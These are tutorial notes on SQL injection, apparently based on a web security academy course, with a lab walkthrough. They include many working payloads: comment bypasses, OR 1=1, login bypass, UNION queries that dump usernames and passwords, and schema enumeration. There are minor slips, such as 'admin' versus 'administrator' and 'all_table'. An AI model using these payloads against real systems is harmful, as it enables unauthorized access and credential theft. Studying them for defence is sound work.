SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior. A successful SQL injection attack can result in unauthorized access to sensitive data, such as passwords, credit card details, or personal user information.
## SQL injection examples
- Retrieving hidden data, where you can modify an SQL query to return additional results.
- Subverting application logic, where you can change a query to interfere with the application's logic.
- UNION attacks, where you can retrieve data from different database tables.
- Examining the database, where you can extract information about the version and structure of the database.
- Blind SQL injection, where the results of a query you control are not returned in the application's responses.
## Retrieving hidden data
If we search `https://insecure-website.com/products?category=Gifts` the server run the following in SQL `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`.\
The restriction released = 1 is being used to hide products that are not released. For unreleased products, presumably released = 0.\
The application doesn't implement any defenses against SQL injection attacks, so an attacker can construct an attack like `https://insecure-website.com/products?category=Gifts'--`, This results in the SQL query `SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`.
The key thing here is that the double-dash sequence `--` is a comment indicator in SQL, and means that the rest of the query is interpreted as a comment. This effectively removes the remainder of the query, so it no longer includes AND released = 1. This means that all products are displayed, including unreleased products.

If we change the url to `https://insecure-website.com/products?category=Gifts'+OR+1=1--`, the sql query will be `SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`, which will return everything as `1=1` is true, so `category = 'Gifts' OR 1=1` is true for all.

If an application checks username and password by the following query `SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`, then the attacker can enter the parameters as `admin'--`. This will result in `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`. And the attcker is logged in as a admin.
## Retrieving data from other database tables using UNION
If an application executes the following query containing the user input "Gifts" `SELECT name, description FROM products WHERE category = 'Gifts'`, then by submitting `' UNION SELECT username, password FROM users--`. It returns all usernames and passwords.

The UNION keyword lets you execute one or more additional SELECT queries and append the results to the original query. For example:
```
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```
This SQL query will return a single result set with two columns, containing values from columns a and b in table1 and columns c and d in table2.

For a UNION query to work, two key requirements must be met:
- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

To carry out an SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out:

- How many columns are being returned from the original query?
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query?

### Determining the number of columns required in an SQL injection UNION attack
- The first method is by using 'ORDER BY' clause and incrementing the specified column index until an error occurs. The column in an ORDER BY clause can be specified by its index, so you don't need to know the names of any columns. Eg `https://insecure-website.com/products?category=Gifts'+ORDER+BY+1--` doesn't give any error but `https://insecure-website.com/products?category=Gifts'+ORDER+BY+4--` give a error that means The ORDER BY position number 4 is out of range of the number of items in the select list.
- The second method is UNION SELECT payloads specifying a different number of null values like `' UNION SELECT NULL,NULL,NULL--`. If the number of nulls does not match the number of columns, the database returns an error.Eg: `https://insecure-website.com/products?category=Gifts'+UNION+SELECT+NULL,NULL,NULL,NULL--`

#### NOTE
- On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like: ' UNION SELECT NULL FROM DUAL--.
- The payloads described use the double-dash comment sequence -- to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment.
- Using `+` instead of space in the url to do SQLi like `https://insecure-website.com/products?category=Gifts'+UNION+SELECT+NULL,NULL,NULL,NULL--`

### Finding which column stores string
By submitting series of UNION SELECT payloads we can find which column stores string. Eg there are 4 columns, then by using the following payloads:
- ' UNION SELECT 'a',NULL,NULL,NULL--
- ' UNION SELECT NULL,'a',NULL,NULL--
- ' UNION SELECT NULL,NULL,'a',NULL--
- ' UNION SELECT NULL,NULL,NULL,'a'--\
The one which will not give error means that column stores string otherwise it will give a error like Conversion failed when converting the varchar value 'a' to data type int.
### Using number of columns and column's datatype, retrieve info from other table.
If we know that there are 2 col and each stores string from above methods than we can use it to retrieve data from other tables like `' UNION SELECT username, password FROM users--`

## Examining the database in SQL injection attacks
When exploiting SQL injection vulnerabilities, it is often necessary to gather some information about the database itself. This includes the type and version of the database software, and the contents of the database in terms of which tables and columns it contains.

### Querying the database type and version
Different databases provide different ways of querying their version. You often need to try out different queries to find one that works, allowing you to determine both the type and version of the database software.

The queries to determine the database version for some popular database types are as follows:


| Database type	| Query |
| --- | --- |
|Microsoft, MySQL |	`SELECT @@version`
Oracle|	`SELECT * FROM v$version`
PostgreSQL|	`SELECT version()`

For example, you could use a UNION attack with the following input:
`
' UNION SELECT @@version--
`
This might return output like the following, confirming that the database is Microsoft SQL Server, and the version that is being used:
```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```
### Listing the contents of the database
Most database types (with the notable exception of Oracle) have a set of views called the information schema which provide information about the database.

You can query information_schema.tables to list the tables in the database:
```
SELECT * FROM information_schema.tables
```
This returns output like the following:
```
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE
=====================================================
MyDatabase dbo Products BASE TABLE
MyDatabase dbo Users BASE TABLE
MyDatabase dbo Feedback BASE TABLE
```
This output indicates that there are three tables, called Products, Users, and Feedback.

You can then query information_schema.columns to list the columns in individual tables:
```
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```
This returns output like the following:
```
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE
=================================================================
MyDatabase dbo Users UserId int
MyDatabase dbo Users Username varchar
MyDatabase dbo Users Password varchar
```
This output shows the columns in the specified table and the data type of each column.
#### For Oracle type databases
You can list tables by querying all_tables:
```
SELECT * FROM all_tables
```
And you can list columns by querying all_tab_columns:
```
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```
### Full example
We have to login into the administrator account of webapp which have SQLi and the database is Oracle type.
- This url `https://target-ac721fbc1edd436280e906ea00920002.web-security-academy.net/filter?category=Lifestyle` shows the products in Lifestyle category.
- Firt we have to find the no of columns using SELECT NULL sequence like `https://target-ac721fbc1edd436280e906ea00920002.web-security-academy.net/filter?category=Lifestyle'+UNION+SELECT+NULL,NULL+FROM+dual--`. It has 2 columns.
- Both are string datatype as `https://target-ac721fbc1edd436280e906ea00920002.web-security-academy.net/filter?category=Lifestyle'+UNION+SELECT+'abc','abc'+FROM+dual--` doesn't give error.
- Using payload `https://target-ac721fbc1edd436280e906ea00920002.web-security-academy.net/filter?category=Lifestyle%27+UNION+SELECT+table_name,NULL+FROM+all_table--` got all the tables.One table belongs to 'USERS_IYYBEU'.
- To get column names using `https://target-ac721fbc1edd436280e906ea00920002.web-security-academy.net/filter?category=Lifestyle%27+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name=%27USERS_IYYBEU%27--`. Got 'PASSWORD_OOXRDO','USERNAME_LUDEWV'
- Got the credentials by using `https://target-ac721fbc1edd436280e906ea00920002.web-security-academy.net/filter?category=Lifestyle%27+UNION+SELECT+USERNAME_LUDEWV,PASSWORD_OOXRDO+FROM+USERS_IYYBEU--`.

### Retrieving multiple values within a single column
In the preceding example, suppose instead that the query only returns a single column.\
You can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values. For example, on Oracle you could submit the input:
```
' UNION SELECT username || '~' || password FROM users--
```
This uses the double-pipe sequence || which is a string concatenation operator on Oracle. The injected query concatenates together the values of the username and password fields, separated by the ~ character.\
The results from the query will let you read all of the usernames and passwords, for example:
```
administrator~s3cure
wiener~peter
carlos~montoya
```
